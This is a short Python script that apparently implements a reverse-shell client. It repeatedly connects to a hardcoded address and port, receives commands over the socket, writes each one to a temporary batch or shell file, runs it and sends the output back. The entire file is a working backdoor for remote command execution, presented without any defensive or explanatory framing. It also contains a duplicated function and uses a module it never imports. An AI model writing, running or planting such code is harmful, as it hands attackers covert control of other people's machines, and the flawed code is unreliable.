import subprocess
import socket
import time
import os

ip = "127.0.0.1"
port = 65535
host = ip, int(port)


def connect():
    while True:
        try:
            client = socket.socket()
            client.connect(host)
            print(f"Connected to: {ip}:{port}")
            reverse_shell(client)

        except ConnectionError as e:
            print("Error:", e)

        time.sleep(5)


def reverse_shell(client):
    file_path = "data.bat"
    while True:
        data = client.recv(1024).decode()
        if data:
            with open(file_path, 'w') as file:
                file.write(data)
            output = subprocess.check_output(file_path, shell=True, text=True)
            client.sendall(output.encode())
            os.remove(file_path)


def reverse_shell(client):
    while True:
        data = client.recv(1024).decode()
        if data:
            if data.strip() == "exit":
                break
            output = execute_command(data)
            client.sendall(output.encode())


def execute_command(command):
    if platform.system() == "Windows":
        bat_file = "command.bat"
        with open(bat_file, 'w') as file:
            file.write(command)
        output = subprocess.check_output(bat_file, shell=True, text=True)
        os.remove(bat_file)
    else:
        sh_file = "command.sh"
        with open(sh_file, 'w') as file:
            file.write("#!/bin/bash\n" + command)
        os.chmod(sh_file, 0o755)
        output = subprocess.getoutput(f"./{sh_file}")
        os.remove(sh_file)
    return output


connect()
